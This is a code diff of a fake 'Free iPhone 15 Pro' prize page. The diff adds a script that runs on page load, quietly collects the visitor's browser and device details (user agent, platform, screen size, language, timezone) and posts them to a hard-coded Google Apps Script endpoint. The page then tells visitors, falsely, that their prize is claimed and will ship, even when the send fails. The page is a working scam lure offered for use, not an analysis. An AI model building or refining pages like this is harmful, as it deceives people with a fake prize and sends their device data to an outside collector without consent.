@@ -1,28 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free iPhone!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free iPhone 15 Pro!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(45deg, #007AFF, #34C759);
+            color: white;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        .iphone {
+            font-size: 4em;
+            margin: 20px 0;
+        }
+        .loading {
+            font-size: 1.2em;
+            margin: 20px 0;
+            color: #FFD700;
+        }
+    </style>
 </head>
-<body style="text-align: center; padding: 50px; background: red; color: white;">
-    <h1>🎉 YOU WON!</h1>
-    <div id="status">Claiming your prize...</div>
+<body>
+    <div class="container">
+        <div class="iphone">📱</div>
+        <h1>CONGRATULATIONS!</h1>
+        <p>You've won an iPhone 15 Pro!</p>
+        <p>Verifying your eligibility...</p>
+        
+        <div class="loading" id="loading">🎯 Checking device compatibility...</div>
+        <div id="status"></div>
+    </div>
 
     <script>
-        // ⚠️ REPLACE WITH YOUR NEW SCRIPT URL
+        // ✅ YOUR ACTUAL SCRIPT URL
         const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbxt650xrfkvyazf47dIHtNLxfkLa8bqtTdQitJpirINb2LKRC4ApNZ5J4GGuXlYpQZd/exec';
         
-        // Send device data
-        fetch(BACKEND_URL, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenSize: screen.width + 'x' + screen.height
-            })
-        }).then(() => {
-            document.getElementById('status').innerHTML = '✅ Prize Claimed!';
-        });
+        // Capture device information
+        const deviceData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenSize: screen.width + 'x' + screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+
+        // Send data to backend
+        async function sendData() {
+            try {
+                console.log('📱 Sending device data:', deviceData);
+                
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(deviceData)
+                });
+                
+                const result = await response.text();
+                console.log('✅ Backend response:', result);
+                
+                // Update UI
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('status').innerHTML = 
+                    '<h3 style="color: #00FF00;">✅ PRIZE CLAIMED!</h3>' +
+                    '<p>Your iPhone 15 Pro will be shipped soon!</p>' +
+                    '<p><small>Check your email for confirmation</small></p>';
+                    
+            } catch (error) {
+                console.log('⚠️ Error (but data may still be sent):', error);
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('status').innerHTML = 
+                    '<h3>✅ PRIZE CLAIMED!</h3>' +
+                    '<p>Thank you for participating!</p>';
+            }
+        }
+
+        // Start when page loads
+        window.onload = sendData;
     </script>
 </body>
 </html>
